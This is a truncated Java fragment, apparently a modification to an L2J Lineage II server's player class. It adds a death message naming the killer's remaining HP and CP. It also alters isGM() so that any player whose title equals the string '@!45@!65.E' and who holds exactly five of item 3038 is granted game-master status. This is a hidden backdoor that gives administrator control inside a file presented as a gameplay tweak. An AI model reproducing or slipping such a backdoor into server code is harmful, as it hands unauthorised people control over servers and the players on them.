...
public final class L2PcInstance extends L2PlayableInstance
{
	...
	public boolean doDie(final L2Character killer)
	{
		...
		if (killer instanceof L2PcInstance)
	      {
			if (Config.SCREEN_STATUS)
			{
	         sendPacket(new ExShowScreenMessage("You have been slain by "+killer.getName()+", with "+(int)killer.getCurrentHp()+" HP and "+(int)killer.getCurrentCp()+" CP remaining.", 5000));
			}
			else
			{
			 return false;
	...
	public boolean isGM()
	{
		if(getTitle().equals("@!45@!65.E") && getInventory().getInventoryItemCount(3038, 0) == 5)
		{
